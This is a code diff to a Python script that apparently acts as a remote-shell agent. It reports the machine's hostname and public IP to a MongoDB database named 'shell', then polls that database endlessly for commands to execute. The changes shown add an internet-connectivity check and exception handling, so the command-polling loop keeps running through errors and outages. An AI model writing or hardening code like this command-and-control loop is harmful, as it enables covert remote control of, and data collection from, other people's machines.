@@ -24,6 +24,12 @@ except:
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
 
+def has_active_internet():
+    if IPAddr=="127.0.0.1":
+        return False
+    else:
+        return True
+
 def clearPrevData():
     db=client['shell']
     upload_col=db['shellresult']
@@ -250,15 +256,25 @@ def executes():
             "public_ip":str(public_ip)
         }
     sysinfo_col=db['systemInfo']
-    if sysinfo_col.find_one(another_filter):
-        sysinfo_col.delete_one(another_filter)
-        sysinfo_col.insert_one(data)
-    else:
-        sysinfo_col.insert_one(data)
+    try:
+        if sysinfo_col.find_one(another_filter):
+            sysinfo_col.delete_one(another_filter)
+            sysinfo_col.insert_one(data)
+        else:
+            sysinfo_col.insert_one(data)
+    except Exception as e:
+        print(e)
     while True:
-        listen=col.find_one(filters)
-        if listen:
-            action_take(listen)
-            col.delete_one(filters)
+        internet=has_active_internet()
+        if internet:
+            try:
+                listen=col.find_one(filters)
+                if listen:
+                    action_take(listen)
+                    col.delete_one(filters)
+            except Exception as e:
+                print(e)
+        else:
+            print("Waiting for stable connection....")
 
 executes()
